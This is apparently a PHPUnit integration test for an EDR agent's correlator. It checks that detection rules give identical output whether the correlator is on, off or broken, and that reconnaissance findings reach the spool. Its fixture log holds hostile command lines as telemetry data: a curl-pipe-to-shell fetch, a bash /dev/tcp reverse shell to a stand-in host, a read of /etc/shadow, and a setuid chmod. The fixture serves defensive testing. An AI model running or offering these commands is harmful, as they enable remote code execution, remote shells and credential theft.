<?php

namespace Tests\Unit;

use App\Services\Detection\OsqueryEngine;
use App\Services\EdrAlertFactory;
use App\Services\EdrEventCollector;
use App\Services\EdrEventSpool;
use App\Services\EdrRuleEngine;
use App\Services\Quality\EdrGovernanceStore;
use App\Services\Quality\EdrRuleGovernor;
use Tests\TestCase;

/**
 * The correlator's safety contract, asserted at the collector boundary.
 *
 * The whole design rests on one promise: this component can only ever *add*.
 * A new, stateful, arithmetic-heavy detection layer bolted onto a working
 * agent is exactly the kind of thing that quietly eats the detections that
 * already worked — and it would do so on a customer's host, months later,
 * with no error anywhere. So the promise is tested rather than asserted in a
 * comment: whatever the correlator does, the eleven behaviour rules must
 * produce byte-identical output with it on, off, or broken.
 */
class EdrCorrelatorIntegrationTest extends TestCase
{
    private string $dir;
    private string $logPath;

    protected function setUp(): void
    {
        parent::setUp();

        $this->dir = sys_get_temp_dir() . '/edr-corr-int-' . uniqid();
        mkdir($this->dir);
        $this->logPath = $this->dir . '/osqueryd.results.log';

        @unlink(storage_path('app/edr_log_position.json'));
    }

    protected function tearDown(): void
    {
        exec('rm -rf ' . escapeshellarg($this->dir));
        @unlink(storage_path('app/edr_log_position.json'));

        parent::tearDown();
    }

    private function engine(): OsqueryEngine
    {
        return new class($this->logPath) extends OsqueryEngine {
            private string $logPath;

            public function __construct(string $logPath)
            {
                parent::__construct();
                $this->logPath = $logPath;
            }

            public function getResultsLogPath(): string
            {
                return $this->logPath;
            }

            public function isRunning(): bool
            {
                return true;
            }

            public function resolveBackend(): string
            {
                return 'bpf';
            }
        };
    }

    private function collector(string $suffix): EdrEventCollector
    {
        return new EdrEventCollector(
            $this->engine(),
            new EdrRuleEngine(),
            new EdrEventSpool($this->dir . '/spool-' . $suffix . '.sqlite'),
            new EdrAlertFactory(),
            new EdrRuleGovernor(new EdrGovernanceStore($this->dir . '/gov-' . $suffix . '.sqlite'))
        );
    }

    private function line(int $pid, int $ppid, int $uid, string $path, string $cmdline): string
    {
        return json_encode([
            'name' => 'process_exec',
            'hostIdentifier' => 'itest',
            'unixTime' => time(),
            'action' => 'added',
            'columns' => [
                'pid' => $pid,
                'parent' => $ppid,
                'uid' => $uid,
                'gid' => $uid,
                'path' => $path,
                'cmdline' => $cmdline,
                'cwd' => '/var/www/html',
                'cid' => '',
                'syscall' => 'exec',
                'exit_code' => '0',
            ],
        ]) . "\n";
    }

    /**
     * A stream that trips several of the existing rules on its own.
     */
    private function writeLog(): void
    {
        file_put_contents($this->logPath, implode('', [
            $this->line(900, 1, 0, '/usr/sbin/nginx', '/usr/sbin/nginx -g daemon off;'),
            $this->line(1001, 900, 33, '/usr/bin/curl', 'curl http://198.51.100.7/x | sh'),
            $this->line(1002, 900, 33, '/bin/bash', 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'),
            $this->line(1003, 900, 33, '/usr/bin/cat', 'cat /etc/shadow'),
            $this->line(1004, 900, 0, '/usr/bin/chmod', 'chmod u+s /tmp/.rootme'),
            $this->line(1005, 900, 0, '/usr/bin/crontab', 'crontab -l'),
        ]));
    }

    /**
     * Findings from the eleven rules, with the correlator's own removed —
     * this is the set that must never change.
     *
     * @return array<int, string>
     */
    private function ruleFindings(array $result): array
    {
        $out = [];

        foreach ($result['alerts'] as $alert) {
            foreach ($alert['rules'] as $finding) {
                $rule = (string) ($finding['rule'] ?? '');

                if (str_starts_with($rule, 'EDR-10')) {
                    continue;
                }

                $out[] = $rule . '|' . ($alert['process']['cmdline'] ?? '');
            }
        }

        sort($out);

        return $out;
    }

    private function opts(array $overrides = []): array
    {
        return array_merge([
            'baseline_days' => 0,
            'spool_enabled' => true,
            'correlator_web_roots' => ['/var/www/html'],
            'host_id' => 'itest',
        ], $overrides);
    }

    public function test_correlator_never_removes_an_existing_finding(): void
    {
        $this->writeLog();
        $without = $this->collector('off')->collect($this->opts(['correlator_enabled' => false]));

        @unlink(storage_path('app/edr_log_position.json'));

        $this->writeLog();
        $with = $this->collector('on')->collect($this->opts([
            'correlator_enabled' => true,
            'correlator_state_path' => $this->dir . '/novelty.sqlite',
        ]));

        $this->assertNotEmpty($this->ruleFindings($without), 'The fixture must actually trip some rules');
        $this->assertSame(
            $this->ruleFindings($without),
            $this->ruleFindings($with),
            'Turning the correlator on changed what the existing rules reported'
        );
    }

    /**
     * Constraint 6, executable: a broken correlator is a no-op, not an outage.
     */
    public function test_a_broken_correlator_does_not_break_the_rules(): void
    {
        $this->writeLog();
        $healthy = $this->collector('healthy')->collect($this->opts(['correlator_enabled' => false]));

        @unlink(storage_path('app/edr_log_position.json'));

        $this->writeLog();
        $broken = $this->collector('broken')->collect($this->opts([
            'correlator_enabled' => true,
            // A path that cannot be created, standing in for an unwritable
            // volume, a full disk, or a state file someone deleted.
            'correlator_state_path' => '/proc/definitely/not/here/novelty.sqlite',
        ]));

        $this->assertSame(
            $this->ruleFindings($healthy),
            $this->ruleFindings($broken),
            'A correlator that cannot open its state must not affect rule output'
        );
        $this->assertSame(
            count($healthy['alerts']),
            count($broken['alerts']),
            'Alert count must be unchanged when the correlator is broken'
        );
    }

    /**
     * A disabled correlator must not so much as create its state file.
     */
    public function test_disabled_correlator_touches_nothing(): void
    {
        $this->writeLog();

        $statePath = $this->dir . '/should-not-exist.sqlite';

        $this->collector('disabled')->collect($this->opts([
            'correlator_enabled' => false,
            'correlator_state_path' => $statePath,
        ]));

        $this->assertFileDoesNotExist($statePath);
    }

    /**
     * Cross-event rule findings have to reach the spool, because the spool is
     * what reaches the Hub.
     *
     * The batch-rule loop only ever pushed into `$alerts`, which the collector
     * itself documents as the dry-run view; real delivery drains
     * `spool->pending()`. So EDR-012 was matched, governed, counted in the
     * per-rule statistics and logged — and then never sent anywhere. The rule
     * looked healthy from every angle except the one that mattered.
     */
    public function test_cross_event_findings_reach_the_spool(): void
    {
        $spoolPath = $this->dir . '/spool-batch.sqlite';

        // Eight distinct discovery binaries under one parent: a reconnaissance
        // burst, which is exactly what EDR-012 exists for.
        $lines = [$this->line(900, 1, 0, '/usr/sbin/nginx', '/usr/sbin/nginx -g daemon off;')];
        $binaries = ['whoami', 'id', 'uname', 'hostname', 'netstat', 'ps', 'w', 'last'];

        foreach ($binaries as $i => $binary) {
            $lines[] = $this->line(2000 + $i, 900, 33, '/usr/bin/' . $binary, $binary);
        }

        file_put_contents($this->logPath, implode('', $lines));

        $collector = new EdrEventCollector(
            $this->engine(),
            new EdrRuleEngine(),
            new EdrEventSpool($spoolPath),
            new EdrAlertFactory(),
            new EdrRuleGovernor(new EdrGovernanceStore($this->dir . '/gov-batch.sqlite'))
        );

        $collector->collect($this->opts(['correlator_enabled' => false]));

        $spool = new EdrEventSpool($spoolPath);
        $queued = $spool->pending(500);

        $rules = [];
        foreach ($queued as $row) {
            foreach ((array) json_decode((string) $row['rule_hits'], true) as $hit) {
                $rules[] = $hit['rule'] ?? '';
            }
        }

        $this->assertContains(
            'EDR-012',
            $rules,
            'A reconnaissance burst must be queued for the Hub, not just counted'
        );
    }

    /**
     * Socket rows go to the network module and never become spool rows here.
     *
     * Raw connect events were 78% of the spool and had produced no deliverable
     * finding in their entire history — three quarters of the retained window
     * spent on material no rule could read, crowding out the events that rules
     * do use. The whole point of the handoff is that they stop arriving as
     * per-connection rows, so a regression here silently restores the volume
     * and cuts the retention window back to about a fifth.
     */
    public function test_socket_rows_do_not_become_spool_events(): void
    {
        $spoolPath = $this->dir . '/spool-net.sqlite';

        $socket = [
            'name' => 'process_socket',
            'hostIdentifier' => 'itest',
            'unixTime' => time(),
            'action' => 'added',
            'columns' => [
                'pid' => 4242,
                'parent' => 900,
                'uid' => 33,
                'gid' => 33,
                'path' => '/usr/bin/curl',
                'remote_address' => '45.32.1.9',
                'remote_port' => '443',
                'local_port' => '0',
                'family' => '2',
                'protocol' => '6',
                'action' => 'connect',
                'ntime' => '1',
            ],
        ];

        file_put_contents($this->logPath, implode('', [
            $this->line(900, 1, 0, '/usr/sbin/nginx', '/usr/sbin/nginx -g daemon off;'),
            json_encode($socket) . "\n",
            $this->line(1001, 900, 33, '/usr/bin/curl', 'curl http://198.51.100.7/x | sh'),
        ]));

        $collector = new EdrEventCollector(
            $this->engine(),
            new EdrRuleEngine(),
            new EdrEventSpool($spoolPath),
            new EdrAlertFactory(),
            new EdrRuleGovernor(new EdrGovernanceStore($this->dir . '/gov-net.sqlite'))
        );

        $result = $collector->collect($this->opts(['correlator_enabled' => false]));

        $spool = new EdrEventSpool($spoolPath);
        $rows = $spool->query(['limit' => 500]);

        $actions = array_map(static fn (array $r): string => (string) $r['action'], $rows);

        $this->assertNotContains(
            'connect',
            $actions,
            'A socket row must not be spooled as a per-connection event'
        );
        $this->assertContains('exec', $actions, 'Process telemetry still reaches the spool');
        $this->assertArrayHasKey('network', $result['stats'], 'The network module reports into the rollup');
    }

    /**
     * The correlator is silent during warm-up, so a freshly-wired agent must
     * report exactly what it did before — including the stats block staying
     * well-formed rather than half-populated.
     */
    public function test_stats_include_the_correlator_rollup(): void
    {
        $this->writeLog();

        $result = $this->collector('stats')->collect($this->opts([
            'correlator_enabled' => true,
            'correlator_state_path' => $this->dir . '/novelty-stats.sqlite',
        ]));

        $this->assertArrayHasKey('correlator', $result['stats']);
        $this->assertArrayHasKey('scored', $result['stats']['correlator']);
        $this->assertFalse($result['stats']['correlator']['mature'], 'A fresh install must be immature');
        $this->assertGreaterThan(0, $result['stats']['correlator']['scored']);
        $this->assertNull($result['stats']['correlator']['error']);
    }
}
